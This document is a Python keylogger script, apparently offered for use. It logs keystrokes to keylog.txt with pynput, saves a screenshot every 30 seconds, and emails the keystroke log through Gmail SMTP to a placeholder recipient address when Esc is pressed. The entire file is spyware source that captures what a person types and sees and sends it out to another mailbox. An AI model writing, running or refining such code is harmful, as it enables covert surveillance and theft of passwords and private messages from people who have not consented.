import pynput.keyboard
import time
import os
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab

# Keep track of pressed keys
pressed_keys = set()

# Send email function
def send_email():
    # Set up email details
    fromaddr = "your email address"
    toaddr = "receiver address"
    password = "your email password"

    # Set up message details
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Log File"

    # Attach log file to email
    attachment = open("keylog.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= keylog.txt")
    msg.attach(p)

    # Send email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    print("Email sent!")
    server.quit()

# Take screenshot function
def take_screenshot():
    # Set up screenshot details
    curr_time = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime())
    screenshot_path = os.getcwd() + "\\" + curr_time + ".png"

    # Take screenshot and save to file
    screen = ImageGrab.grab()
    screen.save(screenshot_path)

    # Wait for 30 seconds and take another screenshot
    threading.Timer(30.0, take_screenshot).start()

# On press function
def on_press(key):
    try:
        # Print key if it hasn't been pressed before
        if key not in pressed_keys:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            log = "[{0}] Key pressed: {1}\n".format(timestamp, key.char)
            print(log, end="")
            pressed_keys.add(key)
            # Save log to file
            with open("keylog.txt", "a") as f:
                f.write(log)
    except AttributeError:
        print("Special key {0} pressed".format(key))

# On release function
def on_release(key):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    print("[{0}] Key released: {1}".format(timestamp, key))
    if key == pynput.keyboard.Key.esc:
        # Stop screenshot thread and send email
        thread.cancel()
        send_email()
        return False

# Set up listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start screenshot thread
    thread = threading.Timer(30.0, take_screenshot)
    thread.start()

    # Wait for listener to stop (when 'esc' is pressed)
    listener.join()
